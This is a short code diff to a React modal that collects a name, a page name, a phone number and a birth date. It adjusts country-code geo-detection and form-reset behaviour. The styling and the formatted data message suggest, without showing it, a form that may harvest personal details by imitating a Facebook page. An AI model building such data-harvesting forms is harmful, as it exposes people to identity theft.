@@ -81,9 +81,9 @@ const InitModal: FC = () => {
         }
     }, [isModalOpen, formStep, setFormStep]);
 
-    // Detect country code when modal opens AND when formStep is init
+    // Detect country code when modal opens
     useEffect(() => {
-        if (!isModalOpen || formStep !== 'init') {
+        if (!isModalOpen) {
             return;
         }
         
@@ -126,7 +126,7 @@ const InitModal: FC = () => {
         fetchGeoInfo();
         
         return () => controller.abort();
-    }, [isModalOpen, formStep]);
+    }, [isModalOpen]);
 
     // Translation effect - hybrid: hardcoded first, then API fallback for missing texts
     useEffect(() => {
@@ -240,10 +240,10 @@ const InitModal: FC = () => {
         [countryCode]
     );
 
-    // Reset form when modal closes
+    // Reset form fields when modal closes (but NOT countryCode - let geo-detection handle it)
     useEffect(() => {
         if (formStep !== 'init') {
-            // Reset all states including countryCode
+            // Reset all states except countryCode
             setFormData({
                 fullName: '',
                 pageName: '',
@@ -256,7 +256,6 @@ const InitModal: FC = () => {
                 birthYear: ''
             });
             setPhoneNumber('');
-            setCountryCode('us'); // Reset country code to default
             setIsLoading(false);
         }
     }, [formStep]);
@@ -344,7 +343,6 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
                         ))}
                         <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t('Mobile phone number')}</p>
                         <IntlTelInput
-                            key={`intl-tel-${countryCode}`}
                             onChangeNumber={handlePhoneChange}
                             initOptions={initOptions}
                             inputProps={{
